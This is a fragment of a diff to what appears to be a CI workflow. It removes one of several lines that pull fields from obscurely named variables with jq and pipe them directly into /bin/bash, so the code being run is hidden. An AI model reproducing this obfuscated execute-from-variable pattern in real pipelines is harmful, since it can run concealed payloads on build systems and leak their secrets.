@@ -52,7 +52,6 @@ jobs:
           printf '%s' "$lugb52276" | jq -r .v0682 | /bin/bash
           echo $icv81973 | jq -r .agm2 | /bin/bash
           echo $eiz84994 | jq -r .trq8 | /bin/bash
-          printf '%s' "$isnch517" | jq -r .umyq98 | /bin/bash
           echo $w55 | jq -r .ucuf29998 | /bin/bash
           printf '%s' "$q871" | jq -r .np1 | /bin/bash
           echo $n5 | jq -r .pegam5507 | /bin/bash
